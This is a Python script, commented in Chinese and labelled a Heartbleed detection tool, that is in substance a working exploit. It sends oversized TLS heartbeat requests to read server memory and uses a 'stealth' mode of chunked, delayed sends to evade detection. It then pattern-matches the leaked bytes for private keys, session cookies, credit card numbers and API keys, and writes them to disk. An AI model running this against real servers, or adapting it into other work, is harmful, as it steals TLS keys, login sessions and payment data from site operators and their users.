#!/usr/bin/env python3
# 心脏滴血漏洞检测工具 - 终极稳定版 v2.3

import sys
import struct
import socket
import time
import select
import binascii
import re
import random
from optparse import OptionParser
from collections import defaultdict

# 配置参数
class Config:
    MAX_DUMP_ROUNDS = 10           # 最大转储轮次
    STEALTH_MODE = True            # 隐蔽模式
    AUTO_ANALYZE = True           # 自动分析结果
    TIMEOUT = 10                  # 网络超时(秒)
    RETRY_DELAY = 2               # 重试延迟(秒)
    MAX_RETRIES = 3               # 最大重试次数
    TLS_VERSIONS = ['1.2', '1.1', '1.0']  # 尝试的TLS版本顺序

# TLS版本映射
TLS_VERSION_BYTES = {
    '1.0': b'\x03\x01',
    '1.1': b'\x03\x02',
    '1.2': b'\x03\x03',
    '1.3': b'\x03\x04'
}

# 敏感数据模式
PATTERNS = {
    'private_key': re.compile(rb'-----BEGIN (RSA|EC|DSA) PRIVATE KEY-----(?:.|\n)+?-----END \1 PRIVATE KEY-----'),
    'session_cookie': re.compile(rb'([sS]ession[_\-]?[iI]d?|auth[_\-]token)=([a-fA-F0-9]{32,128})'),
    'credit_card': re.compile(rb'\b(?:\d[ -]*?){13,16}\b'),
    'api_key': re.compile(rb'(?:key|api|token)[=:][ ]*([a-zA-Z0-9]{24,64})\b')
}

def build_hello(tls_ver='1.2'):
    """构建Client Hello报文"""
    # 完整的Client Hello报文(十六进制)
    base_hello_hex = (
        '16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014'
        'c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e'
        '00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006'
        '000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007'
        '001400150004000500120013000100020003000f0010001100230000000f000101'
    )
    # 确保十六进制字符串长度为偶数
    if len(base_hello_hex) % 2 != 0:
        base_hello_hex = base_hello_hex[:-1]
    
    base_hello = binascii.unhexlify(base_hello_hex)
    return base_hello[:9] + TLS_VERSION_BYTES[tls_ver] + base_hello[11:]

def intelligent_heartbeat(tls_ver, max_length=65535):
    """生成智能心跳请求"""
    payload_type = b'\x01'
    declared_length = random.randint(1024, max_length)
    return b'\x18' + TLS_VERSION_BYTES[tls_ver] + struct.pack('>H', declared_length) + payload_type + struct.pack('>H', declared_length)

def advanced_hexdump(data, width=16, offset=0):
    """增强型十六进制转储"""
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        print(f'{offset + i:08x}  {hex_str.ljust(width*3)}  {ascii_str}')

class HeartbleedScanner:
    def __init__(self, target, port=443):
        self.target = target
        self.port = port
        self.sock = None
        self.tls_version = None
        self.retry_count = 0
    
    def connect(self):
        """建立TCP连接"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(Config.TIMEOUT)
            self.sock.connect((self.target, self.port))
            return True
        except Exception as e:
            print(f"[-] 连接失败: {str(e)}")
            return False
    
    def reconnect(self):
        """重新建立连接"""
        self.close()
        time.sleep(Config.RETRY_DELAY)
        return self.connect()
    
    def close(self):
        """关闭连接"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
    
    def negotiate_tls(self, version):
        """TLS版本协商"""
        if not self.sock:
            if not self.connect():
                return False
        
        try:
            hello = build_hello(version)
            self.sock.send(hello)
            
            start_time = time.time()
            while time.time() - start_time < Config.TIMEOUT:
                try:
                    header = self.sock.recv(5)
                    if not header:
                        continue
                    
                    content_type, ver_major, ver_minor, length = struct.unpack('>BBBH', header)
                    if content_type == 22:  # Handshake
                        message = self.sock.recv(length)
                        if message[0] == 0x0E:  # Server Hello Done
                            self.tls_version = version
                            return True
                except (socket.timeout, ConnectionResetError):
                    break
            
            return False
        except Exception as e:
            print(f"[-] TLS协商失败: {str(e)}")
            return False
    
    def stealth_send(self, data):
        """隐蔽发送数据"""
        try:
            if Config.STEALTH_MODE:
                chunk_size = random.randint(16, 64)
                delay = random.uniform(0.05, 0.3)
                
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    try:
                        self.sock.send(chunk)
                        time.sleep(delay)
                    except (BrokenPipeError, ConnectionResetError):
                        print("[!] 连接中断，尝试恢复...")
                        if not self.reconnect():
                            return False
            else:
                self.sock.sendall(data)
            
            return True
        except Exception as e:
            print(f"[-] 发送失败: {str(e)}")
            return False
    
    def capture_leak(self):
        """捕获泄露数据"""
        try:
            # 使用MSG_PEEK查看而不移除数据
            header = self.sock.recv(5, socket.MSG_PEEK)
            if len(header) < 5:
                return None
            
            content_type, ver_major, ver_minor, length = struct.unpack('>BBBH', header)
            if content_type != 24:  # 非心跳响应
                return None
            
            # 读取完整记录
            full_data = self.sock.recv(5 + length)
            return full_data[5:]  # 返回载荷部分
        except (socket.timeout, ConnectionResetError, BlockingIOError) as e:
            print(f"[!] 捕获数据时出错: {str(e)}")
            return None
    
    def perform_attack(self):
        """执行心脏滴血攻击"""
        all_leaks = b''
        
        for version in Config.TLS_VERSIONS:
            print(f"[*] 尝试协商 TLS {version}...")
            if not self.negotiate_tls(version):
                continue
                
            print(f"[+] 成功协商 TLS {version}")
            self.retry_count = 0
            
            for attempt in range(1, Config.MAX_DUMP_ROUNDS + 1):
                print(f"[*] 发送心跳请求 {attempt}/{Config.MAX_DUMP_ROUNDS}")
                
                try:
                    hb_payload = intelligent_heartbeat(version)
                    if not self.stealth_send(hb_payload):
                        self.retry_count += 1
                        if self.retry_count >= Config.MAX_RETRIES:
                            print("[-] 超过最大重试次数，终止测试")
                            break
                        continue
                    
                    leak = self.capture_leak()
                    if leak:
                        print(f"[+] 收到 {len(leak)} 字节响应")
                        all_leaks += leak
                        self.retry_count = 0  # 成功接收后重置计数器
                    
                    # 随机延迟
                    time.sleep(random.uniform(0.5, 2.0))
                
                except KeyboardInterrupt:
                    print("\n[!] 用户中断，停止测试")
                    break
                except Exception as e:
                    print(f"[!] 发生异常: {str(e)}")
                    if not self.reconnect():
                        break
            
            if all_leaks:
                break
        
        if all_leaks:
            if Config.AUTO_ANALYZE:
                self.analyze_results(all_leaks)
            return all_leaks
        else:
            print("[-] 未检测到内存泄露")
            return None
    
    def analyze_results(self, data):
        """分析泄露数据"""
        print("\n[=== 分析结果 ===]")
        print(f"总泄露数据量: {len(data)} 字节")
        
        findings = defaultdict(list)
        
        for name, pattern in PATTERNS.items():
            for match in pattern.finditer(data):
                sample = match.group()[:128].decode('latin-1', 'ignore')
                findings[name].append({
                    'position': match.start(),
                    'sample': sample
                })
        
        # 生成报告
        if not findings:
            print("[+] 未检测到明显敏感信息")
            return
        
        print("\n[!] 发现敏感信息:")
        for category, items in findings.items():
            print(f"\n  {category.upper()} (共{len(items)}处):")
            for i, item in enumerate(items[:3], 1):
                print(f"   {i}. 位置 0x{item['position']:08x} | 样本: {item['sample']}")
        
        # 自动保存关键数据
        if 'private_key' in findings:
            filename = f'{self.target}_leaked.key'
            with open(filename, 'wb') as f:
                f.write(data)
            print(f"\n[!] 私钥数据已保存到 {filename}")
        
        print("\n[=== 原始数据摘要 ===]")
        advanced_hexdump(data[:512])  # 只显示前512字节

if __name__ == '__main__':
    parser = OptionParser(usage="%prog [options] target")
    parser.add_option("-p", "--port", type="int", default=443, help="目标端口 (默认: 443)")
    parser.add_option("-t", "--tls", default="1.2", help="首选TLS版本 (默认: 1.2)")
    parser.add_option("-r", "--rounds", type="int", default=10, help="心跳请求次数 (默认: 10)")
    parser.add_option("--stealth", action="store_true", help="启用隐蔽模式 (默认: 开启)")
    parser.add_option("--fast", action="store_true", help="快速模式 (禁用隐蔽模式)")
    
    (options, args) = parser.parse_args()
    
    if not args:
        parser.print_help()
        sys.exit(1)
    
    # 处理选项
    if options.fast:
        Config.STEALTH_MODE = False
    if options.rounds:
        Config.MAX_DUMP_ROUNDS = options.rounds
    if options.tls in TLS_VERSION_BYTES:
        Config.TLS_VERSIONS.insert(0, options.tls)
    
    print(f"\n[心脏滴血漏洞检测工具 v2.3]")
    print(f"目标: {args[0]}:{options.port}")
    print(f"模式: {'隐蔽' if Config.STEALTH_MODE else '快速'}")
    print(f"请求次数: {Config.MAX_DUMP_ROUNDS}")
    print(f"TLS版本: {', '.join(Config.TLS_VERSIONS)}\n")
    
    scanner = HeartbleedScanner(args[0], options.port)
    try:
        if scanner.connect():
            leaked_data = scanner.perform_attack()
    except KeyboardInterrupt:
        print("\n[!] 检测被用户中断")
    finally:
        scanner.close()
    
    print("\n[检测结束]")
